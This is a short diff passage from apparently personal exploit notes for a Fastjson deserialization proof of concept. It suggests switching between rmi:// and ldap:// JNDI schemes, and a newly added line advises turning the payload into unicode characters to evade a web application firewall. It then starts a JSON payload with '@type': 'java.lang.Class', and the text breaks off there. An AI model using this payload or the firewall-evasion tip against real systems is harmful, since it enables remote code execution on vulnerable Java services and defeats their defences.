@@ -1,6 +1,6 @@
 poc
 rmi://、ldap:// 可以切换尝试
-
+然后绕过waf的话 就全部转化成 unicode字符。
 
 param={
     "@type": "java.lang.Class",
